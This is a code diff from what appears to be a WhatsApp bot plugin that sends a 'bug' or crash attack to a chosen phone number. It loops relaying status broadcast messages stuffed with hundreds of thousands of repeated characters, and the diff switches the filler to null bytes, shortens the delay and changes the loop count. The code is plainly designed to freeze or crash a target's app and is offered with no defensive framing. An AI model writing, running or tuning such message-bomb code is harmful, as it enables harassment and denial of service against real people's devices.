@@ -15,9 +15,9 @@ export default {
     const jid = (await sock.onWhatsApp(`${number}@s.whatsapp.net`))[0]?.jid;
     if (!jid) return m.replyError(`${m.args[0]} tidak terdaftar diwhatsapp`);
     await m.reply(global.mess.spam);
-    for (let i = 0; i < 1000; i++) {
+    for (let i = 0; i < 50; i++) {
       try {
-        await utils.sleep(300);
+        await utils.sleep(5);
         await sock.relayMessage(
           "status@broadcast",
           {
@@ -26,13 +26,13 @@ export default {
                 {
                   buttonId: "p",
                   buttonText: {
-                    displayText: `x${"ꦾ".repeat(880000)}`,
+                    displayText: `x${"\u0000".repeat(880000)}`,
                   },
                   type: 1,
                 },
               ],
               contentText: "content text",
-              text: `x${"ꦾ".repeat(90000)}`,
+              text: `x${"\u0000".repeat(90000)}`,
               headerType: 2,
             },
           },
